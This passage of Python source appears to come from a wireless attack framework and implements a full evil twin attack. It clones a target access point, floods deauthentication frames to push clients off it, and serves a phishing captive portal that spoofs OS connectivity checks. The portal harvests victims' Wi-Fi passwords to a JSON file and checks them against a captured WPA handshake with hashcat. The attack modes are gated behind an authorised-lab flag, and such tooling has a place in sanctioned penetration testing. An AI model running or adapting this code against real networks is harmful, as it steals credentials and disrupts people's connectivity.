        """Test a password against a WPA handshake via hashcat.

        Args:
            password: Candidate Wi-Fi passphrase.
            handshake_file: Path to a .hc22000 capture file.

        Returns:
            True if hashcat confirms the password as valid, False otherwise.
        """
        hashcat_bin = shutil.which("hashcat")
        if not hashcat_bin:
            logger.warning("hashcat not found; skipping handshake verification")
            return False
        try:
            result = subprocess.run(
                [hashcat_bin, "-m", "22000", handshake_file, "--stdin", "--quiet"],
                input=password.encode("utf-8", errors="replace"),
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                timeout=30,
            )
            return result.returncode == 0
        except Exception as exc:
            logger.debug("hashcat verification error: %s", exc)
            return False

    def serve_portal(
        self,
        template: str,
        portal_ip: str,
        output_file: str,
    ) -> None:
        """Start the HTTP captive portal server and block until interrupted.

        Serves the portal HTML for regular GET requests and returns OS
        connectivity check responses to trigger native captive portal
        popups on Apple, Android, and Windows devices. POST to /capture
        extracts and saves credentials, then redirects to a success page.

        Args:
            template: Template name to load from resources/captive_templates/.
            portal_ip: IP address of the rogue AP gateway.
            output_file: Path where credential JSON is written.
        """
        ssid_str = str(self.ssid).strip() or "FreeWiFi"
        portal_html = self._load_template_html(template, ssid_str)
        cred_store = _CredentialStore(output_file)
        verify = bool(self.verify_handshake)
        handshake = str(self.handshake_file).strip()
        engine = self

        success_html = (
            "<!DOCTYPE html><html><head><meta charset=\"utf-8\">"
            "<title>Connected</title></head><body style=\"font-family:sans-serif;"
            "display:flex;align-items:center;justify-content:center;min-height:100vh\">"
            "<div style=\"text-align:center\">"
            "<h2>Connected!</h2><p>You are now connected to the network.</p>"
            "</div></body></html>"
        )

        class _PortalHandler(http.server.BaseHTTPRequestHandler):
            """HTTP handler for captive portal requests."""

            def _send_html(self, code: int, body: str) -> None:
                encoded = body.encode("utf-8", errors="replace")
                self.send_response(code)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(encoded)))
                self.end_headers()
                if encoded:
                    self.wfile.write(encoded)

            def _send_text(self, code: int, body: str) -> None:
                encoded = body.encode("utf-8", errors="replace")
                self.send_response(code)
                self.send_header("Content-Type", "text/plain")
                self.send_header("Content-Length", str(len(encoded)))
                self.end_headers()
                if encoded:
                    self.wfile.write(encoded)

            def do_GET(self) -> None:
                path = urllib.parse.urlparse(self.path).path

                check = CONNECTIVITY_CHECKS.get(path)
                if check is not None:
                    status, body = check
                    if status == 302:
                        self.send_response(302)
                        self.send_header("Location", f"http://{portal_ip}/")
                        self.send_header("Content-Length", "0")
                        self.end_headers()
                    elif status == 204:
                        self.send_response(204)
                        self.send_header("Content-Length", "0")
                        self.end_headers()
                    else:
                        self._send_html(status, body)
                    return

                if path == "/success":
                    self._send_html(200, success_html)
                    return

                self._send_html(200, portal_html)

            def do_POST(self) -> None:
                path = urllib.parse.urlparse(self.path).path
                if path != "/capture":
                    self.send_response(404)
                    self.end_headers()
                    return

                content_length = int(self.headers.get("Content-Length", 0))
                if content_length > 8192:
                    self.send_response(413)
                    self.end_headers()
                    return

                raw_body = self.rfile.read(content_length).decode("utf-8", errors="replace")
                creds = engine.capture_credentials(raw_body)
                creds["client_ip"] = self.client_address[0]
                creds["user_agent"] = self.headers.get("User-Agent", "")[:256]
                cred_store.add(creds)

                pw = creds.get("password", "")
                print_success(
                    "Credential #{}: IP={} pw={}***".format(
                        cred_store.count,
                        creds["client_ip"],
                        pw[:4] if pw else "",
                    )
                )

                if verify and pw and handshake and os.path.isfile(handshake):
                    if engine._verify_password_against_handshake(pw, handshake):
                        print_success(f"VALID PASSWORD CONFIRMED by handshake: {pw}")

                self.send_response(302)
                self.send_header("Location", "/success")
                self.end_headers()

            def log_message(self, fmt: str, *args: Any) -> None:
                pass

        server = socketserver.TCPServer(("0.0.0.0", 80), _PortalHandler)
        server.allow_reuse_address = True
        http_thread = threading.Thread(target=server.serve_forever, daemon=True)
        http_thread.start()

        print_success(f"Captive portal HTTP server listening on {portal_ip}:80")
        print_info(f"  Credentials -> {output_file}")
        print_info("  Press Ctrl+C to stop.")

        try:
            while True:
                time.sleep(5)
        except KeyboardInterrupt:
            pass
        finally:
            server.shutdown()

    # ------------------------------------------------------------------
    # Interface setup
    # ------------------------------------------------------------------

    def _setup_interface(self, iface: str, portal_ip: str) -> None:
        """Assign the portal IP to the AP interface and bring it up.

        Args:
            iface: AP interface name.
            portal_ip: IPv4 address to assign with /24 prefix length.
        """
        for cmd in (
            ["ip", "addr", "flush", "dev", iface],
            ["ip", "addr", "add", f"{portal_ip}/24", "dev", iface],
            ["ip", "link", "set", iface, "up"],
        ):
            try:
                subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception as exc:
                logger.debug("Interface setup command %s failed: %s", cmd, exc)

    # ------------------------------------------------------------------
    # Deauth thread
    # ------------------------------------------------------------------

    def _deauth_loop(
        self,
        mon_iface: str,
        bssid: str,
        stop_event: threading.Event,
    ) -> None:
        """Continuously send deauth frames until stop_event is set.

        Lazily imports flood_engine_native to avoid circular imports.

        Args:
            mon_iface: Monitor-mode interface for frame injection.
            bssid: BSSID of the target AP.
            stop_event: Threading event; set this to stop the loop.
        """
        try:
            from wirelessxpl.modules.generic.wifi.flood_engine_native import send_deauth
        except ImportError:
            logger.error("flood_engine_native not available; deauth disabled")
            return

        while not stop_event.is_set():
            try:
                send_deauth(
                    interface=mon_iface,
                    bssid=bssid,
                    client="ff:ff:ff:ff:ff:ff",
                    count=5,
                    reason=7,
                )
            except Exception as exc:
                logger.debug("Deauth send error: %s", exc)
            stop_event.wait(timeout=2.0)

    # ------------------------------------------------------------------
    # Mode implementations
    # ------------------------------------------------------------------

    def _info(self) -> None:
        print_info("Phishing Engine")
        print_info("=" * 55)
        print_info("")
        print_info("Full evil twin + captive portal attack (native Python):")
        print_info("  1. Scan for target AP (Scapy Beacon/ProbeResponse sniff)")
        print_info("  2. Clone AP via hostapd (same SSID, channel, optional BSSID)")
        print_info("  3. Native DNS/DHCP (no dnsmasq) via dns_dhcp_server module")
        print_info("  4. Continuous deauth flood via flood_engine_native.send_deauth")
        print_info("  5. HTTP portal with OS connectivity check spoofing")
        print_info("  6. Credential capture to JSON")
        print_info("  7. Optional WPA handshake verification (Fluxion pattern)")
        print_info("")
        print_info("Modes:")
        print_info("  info           - This help screen")
        print_info("  scan           - Scan for nearby APs (requires monitor interface)")
        print_info("  list_templates - Show available captive portal templates")
        print_info("  start          - Run the full evil twin attack")
        print_info("")
        print_info("Quick start:")
        print_info("  set mode scan; set interface_mon wlan0mon; run")
        print_info("  set mode start; set bssid AA:BB:CC:DD:EE:FF; set ssid 'Target'; run")

    def _scan_mode(self) -> None:
        mon_iface = str(self.interface_mon).strip()
        if not mon_iface:
            print_error("Set interface_mon to a monitor-mode interface.")
            return

        duration = float(self.scan_duration)
        print_status(f"Scanning for APs on {mon_iface} for {duration:.0f}s...")

        try:
            aps = self.scan_aps(mon_iface, duration)
        except ImportError as exc:
            print_error(str(exc))
            return

        if not aps:
            print_info("No APs found.")
            return

        print_info("")
        print_info(
            "{:<20} {:<6} {:<9} {:<8} {}".format(
                "BSSID", "CH", "SIGNAL", "ENC", "SSID"
            )
        )
        print_info("-" * 65)
        for ap in aps:
            print_info(
                "{:<20} {:<6} {:<9} {:<8} {}".format(
                    ap["bssid"],
                    ap["channel"],
                    "{}dBm".format(ap["signal"]),
                    ap["encryption"],
                    ap["ssid"] or "(hidden)",
                )
            )
        print_info("")
        print_info(f"Found {len(aps)} AP(s). Use bssid/ssid/channel options with mode=start.")

    def _list_templates_cmd(self) -> None:
        templates = self.list_templates()
        print_info(f"Captive portal templates in {_TEMPLATE_DIR}:")
        if templates:
            for tpl in templates:
                print_info(f"  - {tpl}")
        else:
            print_info("  (directory not found or no templates installed)")

    def _start(self) -> None:
        bssid_val = str(self.bssid).strip()
        if not bssid_val:
            print_error("Set bssid to the target AP MAC address before starting.")
            return

        iface_ap = str(self.interface_ap).strip()
        iface_mon = str(self.interface_mon).strip()
        if not iface_ap:
            print_error("Set interface_ap (AP interface).")
            return

        ssid_val = str(self.ssid).strip() or bssid_val
        channel_val = int(self.channel)
        portal_ip_val = str(self.portal_ip).strip()
        template_val = str(self.template).strip() or "router_admin"
        output_val = str(self.output_file).strip() or ".tmp/phishing_credentials.json"

        os.makedirs(os.path.dirname(os.path.abspath(output_val)), exist_ok=True)

        # Generate and write hostapd config
        tmp_dir = os.path.join(os.path.dirname(os.path.abspath(output_val)))
        os.makedirs(tmp_dir, exist_ok=True)
        conf_content = self.generate_hostapd_conf(
            bssid=bssid_val,
            ssid=ssid_val,
            channel=channel_val,
            iface=iface_ap,
        )
        conf_path = os.path.join(tmp_dir, "phishing_hostapd.conf")
        try:
            with open(conf_path, "w", encoding="utf-8") as fh:
                fh.write(conf_content)
        except OSError as exc:
            print_error(f"Cannot write hostapd config: {exc}")
            return

        print_status(f"Evil twin target: SSID={ssid_val!r}  BSSID={bssid_val}  CH={channel_val}")

        # Start native DNS/DHCP
        try:
            from wirelessxpl.modules.generic.wifi.dns_dhcp_server import CaptiveNetwork
        except ImportError as exc:
            print_error(f"dns_dhcp_server import failed: {exc}")
            return

        network = CaptiveNetwork(portal_ip=portal_ip_val, interface=iface_ap)
        dns_dhcp_started = False
        try:
            network.start()
            dns_dhcp_started = True
            print_success(f"Native DNS/DHCP started (portal={portal_ip_val})")
        except ImportError as exc:
            print_error(f"DNS/DHCP startup failed: {exc}")

        # Configure AP interface IP
        self._setup_interface(iface_ap, portal_ip_val)
        time.sleep(0.5)

        # Start hostapd
        hostapd_proc: subprocess.Popen | None = None
        try:
            hostapd_proc = self.start_hostapd(conf_path)
            time.sleep(2)
            print_success(f"hostapd started (SSID={ssid_val!r})")
        except FileNotFoundError as exc:
            print_error(str(exc))
            if dns_dhcp_started:
                network.stop()
            return

        # Deauth thread
        stop_deauth = threading.Event()
        deauth_thread: threading.Thread | None = None
        if bool(self.deauth_continuous) and iface_mon:
            deauth_thread = threading.Thread(
                target=self._deauth_loop,
                args=(iface_mon, bssid_val, stop_deauth),
                daemon=True,
                name="EvilTwinDeauth",
            )
            deauth_thread.start()
            print_success(f"Deauth flood started on {iface_mon} -> {bssid_val}")

        # HTTP captive portal (blocks until Ctrl+C)
        try:
            self.serve_portal(
                template=template_val,
                portal_ip=portal_ip_val,
                output_file=output_val,
            )
        finally:
            print_status("Shutting down evil twin...")

            stop_deauth.set()
            if deauth_thread and deauth_thread.is_alive():
                deauth_thread.join(timeout=3.0)

            if hostapd_proc and hostapd_proc.poll() is None:
                hostapd_proc.terminate()
                try:
                    hostapd_proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    hostapd_proc.kill()

            if dns_dhcp_started:
                network.stop()

            # Remove temporary hostapd config
            try:
                os.unlink(conf_path)
            except OSError:
                pass

        print_info(f"Session complete. Credentials: {output_val}")

    # ------------------------------------------------------------------
    # Framework interface
    # ------------------------------------------------------------------

    def check(self) -> str:
        """Verify prerequisites: hostapd, iw, and Scapy."""
        missing = []
        if not shutil.which("hostapd"):
            missing.append("hostapd (apt install hostapd)")
        if not shutil.which("iw"):
            missing.append("iw (apt install iw)")
        try:
            import scapy
        except ImportError:
            missing.append("scapy (pip install scapy)")
        if missing:
            return "Missing prerequisites: {}".format(", ".join(missing))
        return "All prerequisites satisfied - ready for evil twin deployment"

    def run(self) -> None:
        """Dispatch to the selected operational mode."""
        op = str(self.mode).strip().lower()

        if op == "info":
            self._info()
            return
        if op == "list_templates":
            self._list_templates_cmd()
            return

        if not bool(self.i_know_scope):
            print_error("Set i_know_scope = true to confirm authorized lab environment.")
            return
        require_authorised_lab()

        if op == "scan":
            self._scan_mode()
        elif op == "start":
            self._start()
        else:
            print_error(
                f"Unknown mode: {op}. Valid: info, scan, list_templates, start"
            )
